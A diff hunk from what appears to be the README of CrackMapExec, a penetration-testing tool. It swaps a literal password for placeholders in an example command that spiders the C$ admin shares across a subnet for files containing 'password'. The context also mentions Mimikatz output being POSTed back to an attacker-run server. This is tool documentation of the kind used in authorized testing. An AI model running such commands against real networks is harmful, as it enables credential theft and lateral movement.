@@ -118,7 +118,7 @@ Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file
 
 Lets Spider the C$ share starting from the ```Users``` folder for the pattern ```password``` in all files and directories (concurrently):
 ```
-#~ python crackmapexec.py -t 150 172.16.206.0/24 -u 'Administrator' -p 'crackmeumofo' --spider Users --depth 10 --pattern password
+#~ python crackmapexec.py -t 150 172.16.206.0/24 -u username -p password --spider Users --depth 10 --pattern password
 [+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
 [+] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
 [+] 172.16.206.132:445 DRUGCOMPANY-PC Started spidering
